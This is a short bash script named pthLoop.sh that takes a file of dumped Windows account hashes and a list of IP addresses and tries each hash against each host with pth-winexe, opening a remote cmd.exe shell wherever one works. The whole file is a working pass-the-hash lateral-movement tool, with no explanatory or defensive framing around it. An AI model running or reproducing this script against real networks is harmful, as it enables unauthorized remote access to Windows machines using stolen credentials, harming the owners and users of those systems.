#!/bin/bash

IFS_BACK=$IFS
IFS=$'\n'

if [ -e temp.txt ]; then
   rm temp.txt
fi

if [ $# -ne 2 ]; then
   echo "USAGE: pthLoop.sh hashFile.txt IPList.txt"
   exit
fi

for IP in $(cat $2); do
   for line in $(cat $1); do
      ID=$(echo $line | cut -d ":" -f 1)
      HASH=$(echo $line | cut -d ":" -f 3,4)
      echo -e "\nTrying $ID  at  $IP\n"
      export SMBHASH=$HASH
      pth-winexe -U $ID% //$IP cmd.exe
   done
done

IFS=$IFS_BACK
